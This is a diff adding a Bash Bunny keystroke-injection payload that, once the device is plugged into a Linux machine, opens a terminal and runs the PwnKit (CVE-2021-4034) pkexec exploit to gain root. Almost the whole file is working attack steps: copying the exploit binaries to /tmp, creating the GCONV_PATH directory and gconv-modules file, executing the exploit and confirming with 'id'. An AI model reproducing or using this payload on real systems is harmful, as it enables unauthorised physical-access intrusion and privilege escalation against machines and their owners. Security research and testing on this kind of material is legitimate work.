@@ -1,0 +1,116 @@
+#!/bin/bash
+#
+# Title:            PwnKit Vulnerability - Local Privilege Escalation
+#
+# Description:      
+#                   The Qualys Research Team has discovered a memory corruption 
+#                   vulnerability in polkit’s pkexec, a SUID-root program that 
+#                   is installed by default on every major Linux distribution.
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Execution
+# Target:           Linux
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ===============
+# Ubuntu 20.04.3 LTS x86_64
+# pkexec version 0.105
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# Yellow quadruple blink .......................... STAGE4
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+udisk mount
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q DELAY 7000
+RUN UNITY xterm
+Q DELAY 7000
+
+LED STAGE2
+
+Q STRING "cd /media/\${USER}/${BB_LABEL}/payloads/${SWITCH_POSITION}/CVE-2021-4034_files/"
+Q ENTER
+Q DELAY 3500
+
+Q STRING "mkdir /tmp/pwnkit_lpe/"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "cp pwnkit.so /tmp/pwnkit_lpe/pwnkit.so"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "cp pwnkit /tmp/pwnkit_lpe/pwnkit"
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+Q STRING "echo \"module UTF-8// PWNKIT// pwnkit 1\" > /tmp/pwnkit_lpe/gconv-modules"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "mkdir -p \"/tmp/pwnkit_lpe/GCONV_PATH=.\""
+Q ENTER
+Q DELAY 1500
+
+Q STRING "cp /usr/bin/true \"/tmp/pwnkit_lpe/GCONV_PATH=./pwnkit.so:.\""
+Q ENTER
+Q DELAY 1500
+
+LED STAGE4
+
+Q STRING "cd /tmp/pwnkit_lpe/"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "/usr/bin/pkexec --version"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "chmod +x ./pwnkit"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "./pwnkit"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "id"
+Q ENTER
+Q DELAY 1500
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+udisk unmount
+
+######## FINISH ########
+
+LED FINISH
+
+shutdown -h 0
